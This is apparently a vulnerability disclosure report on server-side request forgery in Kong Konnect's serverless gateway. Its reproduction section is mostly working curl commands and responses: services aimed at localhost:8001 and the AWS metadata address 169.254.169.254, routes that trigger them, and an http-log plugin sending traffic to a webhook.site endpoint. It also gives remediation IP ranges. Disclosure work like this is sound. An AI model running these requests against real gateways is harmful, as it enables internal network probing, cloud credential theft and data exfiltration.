# SSRF via Service URL Configuration in Kong Konnect Serverless Gateway

## Summary

Kong Konnect's Control Plane API accepts internal/private IP addresses (127.0.0.1, 169.254.169.254) when creating Services, enabling Server-Side Request Forgery attacks. The Kong Gateway actively attempts connections to these internal addresses.

## Severity

**High** - SSRF with confirmed internal IP acceptance and connection attempts

## Steps to Reproduce

### Prerequisites
- Kong Konnect account with Serverless Gateway
- Valid authentication token

### 1. Create Service targeting localhost:8001 (Kong Admin API)

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/services" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"localhost-admin","url":"http://127.0.0.1:8001"}'
```

**Response:** Service created successfully with `host: "127.0.0.1"`, `port: 8001`

### 2. Create Service targeting AWS metadata endpoint

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/services" \
  -H "Authorization: Bearer {TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"aws-metadata","url":"http://169.254.169.254/latest/meta-data/"}'
```

**Response:** Service created successfully with `host: "169.254.169.254"`

### 3. Create Route and trigger SSRF

```bash
# Create route
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/routes" \
  -H "Authorization: Bearer {TOKEN}" \
  -d '{"name":"ssrf-route","paths":["/ssrf"],"service":{"id":"{SERVICE_ID}"}}'

# Trigger SSRF
curl "https://{PROXY_URL}/ssrf"
```

**Response:** 502 error with `x-kong-upstream-latency` header confirming connection attempt

### 4. Confirm external callback via http-log plugin

```bash
curl -X POST "https://eu.api.konghq.com/v2/control-planes/{CONTROL_PLANE_ID}/core-entities/plugins" \
  -H "Authorization: Bearer {TOKEN}" \
  -d '{"name":"http-log","config":{"http_endpoint":"https://webhook.site/{YOUR_ID}"}}'
```

Callbacks received at webhook.site confirm outbound SSRF capability.

## Proof of Concept Evidence

### Services Created with Internal IPs:
```
aws-metadata: 169.254.169.254:80 ✅
localhost-admin-8001: 127.0.0.1:8001 ✅
```

### Gateway Connection Attempt:
```
HTTP/2 502
x-kong-upstream-latency: 2
via: 1.1 kong/3.12.0.0-enterprise-edition
{"message":"An invalid response was received from the upstream server"}
```

## Impact

1. **Internal Network Probing**: Map internal services and infrastructure
2. **AWS Metadata Risk**: Potential IAM credential exposure if network policies change
3. **Kong Admin API Risk**: Full gateway control if localhost becomes accessible
4. **Data Exfiltration**: Plugins can send data to attacker-controlled servers

## Root Cause

The Control Plane API does not validate service URLs against internal/private IP ranges before accepting configurations.

## Remediation

Block these IP ranges at API validation layer:
- `127.0.0.0/8` - localhost
- `10.0.0.0/8` - private
- `172.16.0.0/12` - private
- `192.168.0.0/16` - private
- `169.254.0.0/16` - link-local/metadata

## Test Environment

- **Control Plane**: 670fb8a9-bcce-4ed2-b436-844c047cd849
- **Proxy**: kong-ef74c766bfeucqbca.kongcloud.dev
- **Kong Version**: 3.12.0.0-enterprise-edition
- **Date**: November 26, 2025

---

## Full Exploitation Commands and Logs

### Step 1: Create localhost:8001 Service (Kong Admin API)

```bash
TOKEN="[REDACTED_JWT_TOKEN]"
CP_ID="670fb8a9-bcce-4ed2-b436-844c047cd849"

curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/services" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"localhost-admin-8001","url":"http://127.0.0.1:8001"}'
```

**Response:**
```json
{"host":"127.0.0.1","id":"90913f12-1b0f-4eee-b337-5947e06d15c7","port":8001,"protocol":"http"}
```

### Step 2: Create AWS Metadata Service

```bash
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/services" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"aws-metadata","url":"http://169.254.169.254/latest/meta-data/"}'
```

**Response:**
```json
{"host":"169.254.169.254","id":"2ff4f530-a87b-434e-ac44-cfd0a1e53f1a","path":"/latest/meta-data/","port":80}
```

### Step 3: Create Routes

```bash
# localhost route
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/routes" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"admin-route","paths":["/admin"],"service":{"id":"90913f12-1b0f-4eee-b337-5947e06d15c7"}}'

# AWS metadata route  
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/routes" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"aws-route","paths":["/aws"],"service":{"id":"2ff4f530-a87b-434e-ac44-cfd0a1e53f1a"}}'
```

### Step 4: Create http-log Plugin for External Callback

```bash
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/$CP_ID/core-entities/plugins" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"http-log","config":{"http_endpoint":"https://webhook.site/d4db2f26-e218-4640-bccf-d252ddcc0305"}}'
```

**Response:**
```json
{"id":"8a962408-502e-46ad-ae48-6495bf9a3b70","name":"http-log","config":{"http_endpoint":"https://webhook.site/..."}}
```

### Step 5: Trigger SSRF - localhost:8001

```bash
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/admin"
```

**Response:**
```
< HTTP/2 502 
< x-kong-upstream-latency: 2
< via: 1.1 kong/3.12.0.0-enterprise-edition
{"message":"An invalid response was received from the upstream server"}
```

### Step 6: Trigger SSRF - AWS Metadata

```bash
curl -sv "https://kong-ef74c766bfeucqbca.kongcloud.dev/aws"
```

**Response:**
```
< HTTP/2 502 
< x-kong-upstream-latency: 3
< via: 1.1 kong/3.12.0.0-enterprise-edition
{"message":"An invalid response was received from the upstream server"}
```

### Step 7: Confirm Working External Request

```bash
curl -s "https://kong-ef74c766bfeucqbca.kongcloud.dev/test"
```

**Response:**
```json
{
  "headers": {
    "Host": "httpbin.org",
    "X-Forwarded-Host": "kong-ef74c766bfeucqbca.kongcloud.dev",
    "X-Kong-Request-Id": "8f072a53e15c9b111398d02bdabf8759"
  },
  "origin": "77.91.70.30, 66.51.127.198, 172.16.33.234, 205.234.240.49"
}
```

---

## Key Evidence Summary

| Target | API Accept | Gateway Attempt | Proof |
|--------|------------|-----------------|-------|
| 127.0.0.1:8001 | ✅ 200 OK | ✅ 502 (x-kong-upstream-latency: 2) | Connection attempted |
| 169.254.169.254 | ✅ 200 OK | ✅ 502 (x-kong-upstream-latency: 3) | Connection attempted |
| webhook.site | ✅ 200 OK | ✅ Callbacks received | External SSRF confirmed |
| httpbin.org | ✅ 200 OK | ✅ 200 OK | Working proxy |
